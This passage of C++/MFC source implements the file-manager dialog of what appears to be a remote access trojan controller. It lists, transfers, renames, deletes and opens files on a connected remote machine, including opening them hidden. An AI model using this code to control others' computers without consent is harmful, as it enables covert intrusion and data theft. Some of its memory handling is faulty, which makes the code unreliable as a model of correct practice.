	SetFilePointer(hFile, dwOffsetLow, &dwOffsetHigh, FILE_BEGIN);

	int nRet = 0,i=0;
	for (; i < MAX_WRITE_RETRY; i++)
	{
		// 寫入文件
		nRet = WriteFile
			(
			hFile,
			pData, 
			dwBytesToWrite, 
			&dwBytesWrite,
			NULL
			);
		if (nRet > 0)
		{
			break;
		}
	}
	if (i == MAX_WRITE_RETRY && nRet <= 0)
	{
		::MessageBox(m_hWnd, m_strReceiveLocalFile + " 文件寫入失敗", "警告", MB_OK|MB_ICONWARNING);
	}
	CloseHandle(hFile);
	// 為了比較，計數器遞增
	m_nCounter += dwBytesWrite;
	ShowProgress();
	if (m_bIsStop)
		SendStop();
	else
	{
		BYTE	bToken[9];
		bToken[0] = COMMAND_CONTINUE;
		dwOffsetLow += dwBytesWrite;
		memcpy(bToken + 1, &dwOffsetHigh, sizeof(dwOffsetHigh));
		memcpy(bToken + 5, &dwOffsetLow, sizeof(dwOffsetLow));
		m_iocpServer->Send(m_pContext, bToken, sizeof(bToken));
	}
}

void CFileManagerDlg::EndLocalRecvFile()
{
	m_nCounter = 0;
	m_strOperatingFile = "";
	m_nOperatingFileLength = 0;

	if (m_Remote_Download_Job.IsEmpty() || m_bIsStop)
	{
		m_Remote_Download_Job.RemoveAll();
		m_bIsStop = false;
		// 重置傳輸方式
		m_nTransferMode = TRANSFER_MODE_NORMAL;	
		EnableControl(TRUE);
		FixedLocalFileList(".");
		ShowMessage("本地：裝載目錄 %s\*.* 完成", m_Local_Path);
	}
	else
	{
		// 我靠，不sleep下會出錯，服了可能以前的數據還沒send出去
		Sleep(5);
		SendDownloadJob();
	}
	return;
}

void CFileManagerDlg::EndLocalUploadFile()
{

	m_nCounter = 0;
	m_strOperatingFile = "";
	m_nOperatingFileLength = 0;
	
	if (m_Remote_Upload_Job.IsEmpty() || m_bIsStop)
	{
		m_Remote_Upload_Job.RemoveAll();
		m_bIsStop = false;
		EnableControl(TRUE);
		GetRemoteFileList(".");
		ShowMessage("遠程：裝載目錄 %s\*.* 完成", m_Remote_Path);
	}
	else
	{
		// 我靠，不sleep下會出錯，服了可能以前的數據還沒send出去
		Sleep(5);
		SendUploadJob();
	}
	return;
}
void CFileManagerDlg::EndRemoteDeleteFile()
{
	if (m_Remote_Delete_Job.IsEmpty() || m_bIsStop)
	{
		m_bIsStop = false;
		EnableControl(TRUE);
		GetRemoteFileList(".");
		ShowMessage("遠程：裝載目錄 %s\*.* 完成", m_Remote_Path);
	}
	else
	{
		// 我靠，不sleep下會出錯，服了可能以前的數據還沒send出去
		Sleep(5);
		SendDeleteJob();
	}
	return;
}


void CFileManagerDlg::SendException()
{
	BYTE	bBuff = COMMAND_EXCEPTION;
	m_iocpServer->Send(m_pContext, &bBuff, 1);
}

void CFileManagerDlg::SendContinue()
{
	BYTE	bBuff = COMMAND_CONTINUE;
	m_iocpServer->Send(m_pContext, &bBuff, 1);
}

void CFileManagerDlg::SendStop()
{
	BYTE	bBuff = COMMAND_STOP;
	m_iocpServer->Send(m_pContext, &bBuff, 1);
}

void CFileManagerDlg::ShowProgress()
{
	char	*lpDirection = NULL;
	if (m_bIsUpload)
		lpDirection = "傳送文件";
	else
		lpDirection = "接收文件";


	if ((int)m_nCounter == -1)
	{
		m_nCounter = m_nOperatingFileLength;
	}

	int	progress = (float)(m_nCounter * 100) / m_nOperatingFileLength;
	ShowMessage("%s %s %dKB (%d%%)", lpDirection, m_strOperatingFile, (int)(m_nCounter / 1024), progress);
	m_ProgressCtrl->SetPos(progress);

	if (m_nCounter == m_nOperatingFileLength)
	{
		m_nCounter = m_nOperatingFileLength = 0;
		// 關閉文件句柄
	}
}

void CFileManagerDlg::OnLocalDelete()
{
	m_bIsUpload = true;
	CString str;
	if (m_list_local.GetSelectedCount() > 1)
		str.Format("確定要將這 %d 項刪除嗎?", m_list_local.GetSelectedCount());
	else
	{
		CString file = m_list_local.GetItemText(m_list_local.GetSelectionMark(), 0);
		if (m_list_local.GetItemData(m_list_local.GetSelectionMark()) == 1)
			str.Format("確實要刪除文件夾“%s”並將所有內容刪除嗎?", file);
		else
			str.Format("確實要把“%s”刪除嗎?", file);
	}
	if (::MessageBox(m_hWnd, str, "確認刪除", MB_YESNO|MB_ICONQUESTION) == IDNO)
		return;

	EnableControl(FALSE);

	POSITION pos = m_list_local.GetFirstSelectedItemPosition(); //iterator for the CListCtrl
	while(pos) //so long as we have a valid POSITION, we keep iterating
	{
		int nItem = m_list_local.GetNextSelectedItem(pos);
		CString	file = m_Local_Path + m_list_local.GetItemText(nItem, 0);
		// 如果是目錄
		if (m_list_local.GetItemData(nItem))
		{
			file += '\\';
			DeleteDirectory(file);
		}
		else
		{
			DeleteFile(file);
		}
	} //EO while(pos) -- at this point we have deleted the moving items and stored them in memory
	// 禁用文件管理窗口
	EnableControl(TRUE);

	FixedLocalFileList(".");
}

void CFileManagerDlg::OnRemoteDelete() 
{
	m_bIsUpload = false;
	// TODO: Add your command handler code here
	CString str;
	if (m_list_remote.GetSelectedCount() > 1)
		str.Format("確定要將這 %d 項刪除嗎?", m_list_remote.GetSelectedCount());
	else
	{
		CString file = m_list_remote.GetItemText(m_list_remote.GetSelectionMark(), 0);
		if (m_list_remote.GetItemData(m_list_remote.GetSelectionMark()) == 1)
			str.Format("確實要刪除文件夾“%s”並將所有內容刪除嗎?", file);
		else
			str.Format("確實要把“%s”刪除嗎?", file);
	}
	if (::MessageBox(m_hWnd, str, "確認刪除", MB_YESNO|MB_ICONQUESTION) == IDNO)
		return;
	m_Remote_Delete_Job.RemoveAll();
	POSITION pos = m_list_remote.GetFirstSelectedItemPosition(); //iterator for the CListCtrl
	while(pos) //so long as we have a valid POSITION, we keep iterating
	{
		int nItem = m_list_remote.GetNextSelectedItem(pos);
		CString	file = m_Remote_Path + m_list_remote.GetItemText(nItem, 0);
		// 如果是目錄
		if (m_list_remote.GetItemData(nItem))
			file += '\\';

		m_Remote_Delete_Job.AddTail(file);
	} //EO while(pos) -- at this point we have deleted the moving items and stored them in memory

	EnableControl(FALSE);
	// 發送第一個下載任務
	SendDeleteJob();
}

void CFileManagerDlg::OnRemoteStop() 
{
	// TODO: Add your command handler code here
	m_bIsStop = true;
}

void CFileManagerDlg::OnLocalStop() 
{
	// TODO: Add your command handler code here
	m_bIsStop = true;
}

void CFileManagerDlg::PostNcDestroy() 
{
	// TODO: Add your specialized code here and/or call the base class
	delete this;
	CDialog::PostNcDestroy();
}

void CFileManagerDlg::SendTransferMode()
{
	CFileTransferModeDlg	dlg(this);
	dlg.m_strFileName = m_strUploadRemoteFile;
	switch (dlg.DoModal())
	{
	case IDC_OVERWRITE:
		m_nTransferMode = TRANSFER_MODE_OVERWRITE;
		break;
	case IDC_OVERWRITE_ALL:
		m_nTransferMode = TRANSFER_MODE_OVERWRITE_ALL;
		break;
	case IDC_ADDITION:
		m_nTransferMode = TRANSFER_MODE_ADDITION;
		break;
	case IDC_ADDITION_ALL:
		m_nTransferMode = TRANSFER_MODE_ADDITION_ALL;
		break;
	case IDC_JUMP:
		m_nTransferMode = TRANSFER_MODE_JUMP;
		break;
	case IDC_JUMP_ALL:
		m_nTransferMode = TRANSFER_MODE_JUMP_ALL;
		break;
	case IDC_CANCEL:
		m_nTransferMode = TRANSFER_MODE_CANCEL;
		break;
	}
	if (m_nTransferMode == TRANSFER_MODE_CANCEL)
	{
		m_bIsStop = true;
		EndLocalUploadFile();
		return;
	}

	BYTE bToken[5];
	bToken[0] = COMMAND_SET_TRANSFER_MODE;
	memcpy(bToken + 1, &m_nTransferMode, sizeof(m_nTransferMode));
	m_iocpServer->Send(m_pContext, (unsigned char *)&bToken, sizeof(bToken));
}

void CFileManagerDlg::SendFileData()
{
	FILESIZE *pFileSize = (FILESIZE *)(m_pContext->m_DeCompressionBuffer.GetBuffer(1));
	LONG	dwOffsetHigh = pFileSize->dwSizeHigh ;
	LONG	dwOffsetLow = pFileSize->dwSizeLow;

	m_nCounter = MAKEINT64(pFileSize->dwSizeLow, pFileSize->dwSizeHigh);

	ShowProgress();


	if (m_nCounter == m_nOperatingFileLength || pFileSize->dwSizeLow == -1 || m_bIsStop)
	{
		EndLocalUploadFile();
		return;
	}


	HANDLE	hFile;
	hFile = CreateFile(m_strOperatingFile.GetBuffer(0), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		return;
	}
	
	SetFilePointer(hFile, dwOffsetLow, &dwOffsetHigh, FILE_BEGIN);
	
	int		nHeadLength = 9; // 1 + 4 + 4  數據包頭部大小，為固定的9
	
	DWORD	nNumberOfBytesToRead = MAX_SEND_BUFFER - nHeadLength;
	DWORD	nNumberOfBytesRead = 0;
	BYTE	*lpBuffer = (BYTE *)LocalAlloc(LPTR, MAX_SEND_BUFFER);
	// Token,  大小，偏移，數據
	lpBuffer[0] = COMMAND_FILE_DATA;
	memcpy(lpBuffer + 1, &dwOffsetHigh, sizeof(dwOffsetHigh));
	memcpy(lpBuffer + 5, &dwOffsetLow, sizeof(dwOffsetLow));	
	// 返回值
	bool	bRet = true;
	ReadFile(hFile, lpBuffer + nHeadLength, nNumberOfBytesToRead, &nNumberOfBytesRead, NULL);
	CloseHandle(hFile);


	if (nNumberOfBytesRead > 0)
	{
		int	nPacketSize = nNumberOfBytesRead + nHeadLength;
		m_iocpServer->Send(m_pContext, lpBuffer, nPacketSize);
	}
	LocalFree(lpBuffer);
}


bool CFileManagerDlg::DeleteDirectory(LPCTSTR lpszDirectory)
{
	WIN32_FIND_DATA	wfd;
	char	lpszFilter[MAX_PATH];
	
	wsprintf(lpszFilter, "%s\\*.*", lpszDirectory);
	
	HANDLE hFind = FindFirstFile(lpszFilter, &wfd);
	if (hFind == INVALID_HANDLE_VALUE) // 如果沒有找到或查找失敗
		return FALSE;
	
	do
	{
		if (wfd.cFileName[0] != '.')
		{
			if (wfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
			{
				char strDirectory[MAX_PATH];
				wsprintf(strDirectory, "%s\\%s", lpszDirectory, wfd.cFileName);
				DeleteDirectory(strDirectory);
			}
			else
			{
				char strFile[MAX_PATH];
				wsprintf(strFile, "%s\\%s", lpszDirectory, wfd.cFileName);
				DeleteFile(strFile);
			}
		}
	} while (FindNextFile(hFind, &wfd));
	
	FindClose(hFind); // 關閉查找句柄
	
	if(!RemoveDirectory(lpszDirectory))
	{
		return FALSE;
	}
	return true;
}

void CFileManagerDlg::OnLocalNewfolder() 
{
	if (m_Local_Path == "")
		return;
	// TODO: Add your command handler code here

	CInputDialog	dlg;
	dlg.Init(_T("新建目錄"), _T("請輸入目錄名稱:"), this);

	if (dlg.DoModal() == IDOK && dlg.m_str.GetLength())
	{
		// 創建多層目錄
		MakeSureDirectoryPathExists(m_Local_Path + dlg.m_str + "\\");
		FixedLocalFileList(".");
	}
}

void CFileManagerDlg::OnRemoteNewfolder() 
{
	if (m_Remote_Path == "")
		return;
	// TODO: Add your command handler code here
	// TODO: Add your command handler code here
	CInputDialog	dlg;
	dlg.Init(_T("新建目錄"), _T("請輸入目錄名稱:"), this);

	if (dlg.DoModal() == IDOK && dlg.m_str.GetLength())
	{
		CString file = m_Remote_Path + dlg.m_str + "\\";
		UINT	nPacketSize = file.GetLength() + 2;
		// 創建多層目錄
		LPBYTE	lpBuffer = (LPBYTE)LocalAlloc(LPTR, file.GetLength() + 2);
		lpBuffer[0] = COMMAND_CREATE_FOLDER;
		memcpy(lpBuffer + 1, file.GetBuffer(0), nPacketSize - 1);
		m_iocpServer->Send(m_pContext, lpBuffer, nPacketSize);
	}
}

void CFileManagerDlg::OnTransfer()
{
	// TODO: Add your command handler code here
	POINT pt;
	GetCursorPos(&pt);
	if (GetFocus()->m_hWnd == m_list_local.m_hWnd)
	{
		OnLocalCopy();
	}
	else
	{
		OnRemoteCopy();
	}
}

void CFileManagerDlg::OnRename() 
{
	// TODO: Add your command handler code here
	POINT pt;
	GetCursorPos(&pt);
	if (GetFocus()->m_hWnd == m_list_local.m_hWnd)
	{
		m_list_local.EditLabel(m_list_local.GetSelectionMark());
	}
	else
	{
		m_list_remote.EditLabel(m_list_remote.GetSelectionMark());
	}	
}

void CFileManagerDlg::OnEndlabeleditListLocal(NMHDR* pNMHDR, LRESULT* pResult) 
{
	LV_DISPINFO* pDispInfo = (LV_DISPINFO*)pNMHDR;
	// TODO: Add your control notification handler code here


	CString str, strExistingFileName, strNewFileName;
	m_list_local.GetEditControl()->GetWindowText(str);

	strExistingFileName = m_Local_Path + m_list_local.GetItemText(pDispInfo->item.iItem, 0);
	strNewFileName = m_Local_Path + str;
	*pResult = ::MoveFile(strExistingFileName.GetBuffer(0), strNewFileName.GetBuffer(0));
}

void CFileManagerDlg::OnEndlabeleditListRemote(NMHDR* pNMHDR, LRESULT* pResult) 
{
	LV_DISPINFO* pDispInfo = (LV_DISPINFO*)pNMHDR;
	// TODO: Add your control notification handler code here
	CString str, strExistingFileName, strNewFileName;
	m_list_remote.GetEditControl()->GetWindowText(str);
	
	strExistingFileName = m_Remote_Path + m_list_remote.GetItemText(pDispInfo->item.iItem, 0);
	strNewFileName = m_Remote_Path + str;
	
	if (strExistingFileName != strNewFileName)
	{
		UINT nPacketSize = strExistingFileName.GetLength() + strNewFileName.GetLength() + 3;
		LPBYTE lpBuffer = (LPBYTE)LocalAlloc(LPTR, nPacketSize);
		lpBuffer[0] = COMMAND_RENAME_FILE;
		memcpy(lpBuffer + 1, strExistingFileName.GetBuffer(0), strExistingFileName.GetLength() + 1);
		memcpy(lpBuffer + 2 + strExistingFileName.GetLength(), 
			strNewFileName.GetBuffer(0), strNewFileName.GetLength() + 1);
		m_iocpServer->Send(m_pContext, lpBuffer, nPacketSize);
		LocalFree(lpBuffer);
	}
	*pResult = 1;
}

void CFileManagerDlg::OnDelete() 
{
	// TODO: Add your command handler code here
	POINT pt;
	GetCursorPos(&pt);
	if (GetFocus()->m_hWnd == m_list_local.m_hWnd)
	{
		OnLocalDelete();
	}
	else
	{
		OnRemoteDelete();
	}		
}

void CFileManagerDlg::OnNewfolder() 
{
	// TODO: Add your command handler code here
	POINT pt;
	GetCursorPos(&pt);
	if (GetFocus()->m_hWnd == m_list_local.m_hWnd)
	{
		OnLocalNewfolder();
	}
	else
	{
		OnRemoteNewfolder();
	}		
}

void CFileManagerDlg::OnRefresh() 
{
	// TODO: Add your command handler code here
	POINT pt;
	GetCursorPos(&pt);
	if (GetFocus()->m_hWnd == m_list_local.m_hWnd)
	{
		FixedLocalFileList(".");
	}
	else
	{
		GetRemoteFileList(".");
	}		
}

void CFileManagerDlg::OnLocalOpen() 
{
	// TODO: Add your command handler code here
	CString	str;
	str = m_Local_Path + m_list_local.GetItemText(m_list_local.GetSelectionMark(), 0);
	ShellExecute(NULL, "open", str, NULL, NULL, SW_SHOW);
}

void CFileManagerDlg::OnRemoteOpenShow() 
{
	// TODO: Add your command handler code here
	CString	str;
	str = m_Remote_Path + m_list_remote.GetItemText(m_list_remote.GetSelectionMark(), 0);

	int		nPacketLength = str.GetLength() + 2;
	LPBYTE	lpPacket = (LPBYTE)LocalAlloc(LPTR, nPacketLength);
	lpPacket[0] = COMMAND_OPEN_FILE_SHOW;
	memcpy(lpPacket + 1, str.GetBuffer(0), nPacketLength - 1);
	m_iocpServer->Send(m_pContext, lpPacket, nPacketLength);
	delete [] lpPacket;	
}

void CFileManagerDlg::OnRemoteOpenHide() 
{
	// TODO: Add your command handler code here
	CString	str;
	str = m_Remote_Path + m_list_remote.GetItemText(m_list_remote.GetSelectionMark(), 0);
	
	int		nPacketLength = str.GetLength() + 2;
	LPBYTE	lpPacket = (LPBYTE)LocalAlloc(LPTR, nPacketLength);
	lpPacket[0] = COMMAND_OPEN_FILE_HIDE;
	memcpy(lpPacket + 1, str.GetBuffer(0), nPacketLength - 1);
	m_iocpServer->Send(m_pContext, lpPacket, nPacketLength);
	delete [] lpPacket;
}

void CFileManagerDlg::OnRclickListLocal(NMHDR* pNMHDR, LRESULT* pResult) 
{
	// TODO: Add your control notification handler code here
	CListCtrl	*pListCtrl = &m_list_local;
	CMenu	popup;
	popup.LoadMenu(IDR_FILEMANAGER);
	CMenu*	pM = popup.GetSubMenu(0);
	CPoint	p;
	GetCursorPos(&p);
	pM->DeleteMenu(6, MF_BYPOSITION);
	if (pListCtrl->GetSelectedCount() == 0)
	{
		int	count = pM->GetMenuItemCount();
		for (int i = 0; i < count; i++)
		{
			pM->EnableMenuItem(i, MF_BYPOSITION | MF_GRAYED);
		}
	}
	if (pListCtrl->GetSelectedCount() <= 1)
	{
		pM->EnableMenuItem(IDM_NEWFOLDER, MF_BYCOMMAND | MF_ENABLED);
	}
	if (pListCtrl->GetSelectedCount() == 1)
	{
		// 是文件夾
		if (pListCtrl->GetItemData(pListCtrl->GetSelectionMark()) == 1)
			pM->EnableMenuItem(IDM_LOCAL_OPEN, MF_BYCOMMAND | MF_GRAYED);
		else
			pM->EnableMenuItem(IDM_LOCAL_OPEN, MF_BYCOMMAND | MF_ENABLED);
	}
	else
		pM->EnableMenuItem(IDM_LOCAL_OPEN, MF_BYCOMMAND | MF_GRAYED);


	pM->EnableMenuItem(IDM_REFRESH, MF_BYCOMMAND | MF_ENABLED);
	pM->TrackPopupMenu(TPM_LEFTALIGN, p.x, p.y, this);	
	*pResult = 0;
}

void CFileManagerDlg::OnRclickListRemote(NMHDR* pNMHDR, LRESULT* pResult) 
{
	// TODO: Add your control notification handler code here
	int	nRemoteOpenMenuIndex = 5;
	CListCtrl	*pListCtrl = &m_list_remote;
	CMenu	popup;
	popup.LoadMenu(IDR_FILEMANAGER);
	CMenu*	pM = popup.GetSubMenu(0);
	CPoint	p;
	GetCursorPos(&p);
	pM->DeleteMenu(IDM_LOCAL_OPEN, MF_BYCOMMAND);
	if (pListCtrl->GetSelectedCount() == 0)
	{
		int	count = pM->GetMenuItemCount();
		for (int i = 0; i < count; i++)
		{
			pM->EnableMenuItem(i, MF_BYPOSITION | MF_GRAYED);
		}
	}
	if (pListCtrl->GetSelectedCount() <= 1)
	{
		pM->EnableMenuItem(IDM_NEWFOLDER, MF_BYCOMMAND | MF_ENABLED);
	}
	if (pListCtrl->GetSelectedCount() == 1)
	{
		// 是文件夾
		if (pListCtrl->GetItemData(pListCtrl->GetSelectionMark()) == 1)
			pM->EnableMenuItem(nRemoteOpenMenuIndex, MF_BYPOSITION| MF_GRAYED);
		else
			pM->EnableMenuItem(nRemoteOpenMenuIndex, MF_BYPOSITION | MF_ENABLED);
	}
	else
		pM->EnableMenuItem(nRemoteOpenMenuIndex, MF_BYPOSITION | MF_GRAYED);
	
	
	pM->EnableMenuItem(IDM_REFRESH, MF_BYCOMMAND | MF_ENABLED);
	pM->TrackPopupMenu(TPM_LEFTALIGN, p.x, p.y, this);	
	*pResult = 0;
}

bool CFileManagerDlg::MakeSureDirectoryPathExists(LPCTSTR pszDirPath)
{
    LPTSTR p, pszDirCopy;
    DWORD dwAttributes;

    // Make a copy of the string for editing.

    __try
    {
        pszDirCopy = (LPTSTR)malloc(sizeof(TCHAR) * (lstrlen(pszDirPath) + 1));

        if(pszDirCopy == NULL)
            return FALSE;

        lstrcpy(pszDirCopy, pszDirPath);

        p = pszDirCopy;

        //  If the second character in the path is "\", then this is a UNC
        //  path, and we should skip forward until we reach the 2nd \ in the path.

        if((*p == TEXT('\\')) && (*(p+1) == TEXT('\\')))
        {
            p++;            // Skip over the first \ in the name.
            p++;            // Skip over the second \ in the name.

            //  Skip until we hit the first "\" (\\Server\).

            while(*p && *p != TEXT('\\'))
            {
                p = CharNext(p);
            }

            // Advance over it.

            if(*p)
            {
                p++;
            }

            //  Skip until we hit the second "\" (\\Server\Share\).

            while(*p && *p != TEXT('\\'))
            {
                p = CharNext(p);
            }

            // Advance over it also.

            if(*p)
            {
                p++;
            }

        }
        else if(*(p+1) == TEXT(':')) // Not a UNC.  See if it's <drive>:
        {
            p++;
            p++;

            // If it exists, skip over the root specifier

            if(*p && (*p == TEXT('\\')))
            {
                p++;
            }
        }

		while(*p)
        {
            if(*p == TEXT('\\'))
            {
                *p = TEXT('\0');
                dwAttributes = GetFileAttributes(pszDirCopy);

                // Nothing exists with this name.  Try to make the directory name and error if unable to.
                if(dwAttributes == 0xffffffff)
                {
                    if(!CreateDirectory(pszDirCopy, NULL))
                    {
                        if(GetLastError() != ERROR_ALREADY_EXISTS)
                        {
                            free(pszDirCopy);
                            return FALSE;
                        }
                    }
                }
                else
                {
                    if((dwAttributes & FILE_ATTRIBUTE_DIRECTORY) != FILE_ATTRIBUTE_DIRECTORY)
                    {
                        // Something exists with this name, but it's not a directory... Error
                        free(pszDirCopy);
                        return FALSE;
                    }
                }
 
                *p = TEXT('\\');
            }

            p = CharNext(p);
        }
    }
    __except(EXCEPTION_EXECUTE_HANDLER)
    {
        // SetLastError(GetExceptionCode());
        free(pszDirCopy);
        return FALSE;
    }

    free(pszDirCopy);
    return TRUE;
}